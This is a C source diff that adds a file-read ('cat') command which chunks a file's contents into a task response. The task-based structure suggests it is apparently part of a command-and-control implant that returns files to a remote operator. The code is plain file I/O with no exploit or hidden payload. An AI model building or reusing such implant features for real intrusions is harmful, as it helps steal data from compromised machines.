@@ -459,3 +459,96 @@ end:;
     LocalFree(filepath);
 }
 #endif
+
+
+#ifdef INCLUDE_CMD_CAT
+
+#define CAT_READ_SIZE (512 * 1024)  // 512 KB per read - avoids one giant alloc
+
+VOID FileSystemCat(PCHAR taskUuid, PPARSER arguments)
+{
+    UINT32 nbArg = ParserGetInt32(arguments);
+    if (nbArg < 1)
+    {
+        PackageError(taskUuid, ERROR_INVALID_PARAMETER);
+        return;
+    }
+
+    SIZE_T size     = 0;
+    PCHAR  filepath = ParserStringCopy(arguments, &size);
+    if (!filepath || !filepath[0])
+    {
+        if (filepath) LocalFree(filepath);
+        PackageError(taskUuid, ERROR_INVALID_PARAMETER);
+        return;
+    }
+
+    HANDLE hFile = CreateFileA(
+        filepath,
+        GENERIC_READ,
+        FILE_SHARE_READ | FILE_SHARE_WRITE,
+        NULL,
+        OPEN_EXISTING,
+        FILE_ATTRIBUTE_NORMAL,
+        NULL
+    );
+
+    if (hFile == INVALID_HANDLE_VALUE)
+    {
+        PackageError(taskUuid, GetLastError());
+        goto cleanup;
+    }
+
+    LARGE_INTEGER fileSize = { 0 };
+    if (!GetFileSizeEx(hFile, &fileSize))
+    {
+        PackageError(taskUuid, GetLastError());
+        goto cleanup;
+    }
+
+    if (fileSize.QuadPart == 0)
+    {
+        // Empty file - return empty output
+        PPackage data = PackageInit(0, FALSE);
+        PackageComplete(taskUuid, data);
+        PackageDestroy(data);
+        goto cleanup;
+    }
+
+    PPackage data = PackageInit(0, FALSE);
+
+    PCHAR  buf       = (PCHAR)LocalAlloc(LMEM_FIXED, CAT_READ_SIZE);
+    DWORD  bytesRead = 0;
+
+    if (!buf)
+    {
+        PackageDestroy(data);
+        PackageError(taskUuid, ERROR_OUTOFMEMORY);
+        goto cleanup;
+    }
+
+    while (ReadFile(hFile, buf, CAT_READ_SIZE, &bytesRead, NULL) && bytesRead > 0)
+    {
+        PackageAddBytes(data, (PBYTE)buf, bytesRead, FALSE);
+    }
+
+    DWORD readErr = GetLastError();
+    LocalFree(buf);
+
+    if (readErr != ERROR_SUCCESS && readErr != ERROR_HANDLE_EOF)
+    {
+        PackageDestroy(data);
+        PackageError(taskUuid, readErr);
+        goto cleanup;
+    }
+
+    PackageComplete(taskUuid, data);
+    PackageDestroy(data);
+
+cleanup:
+    if (hFile && hFile != INVALID_HANDLE_VALUE)
+        CloseHandle(hFile);
+    LocalFree(filepath);
+}
+
+#endif  //INCLUDE_CMD_CAT
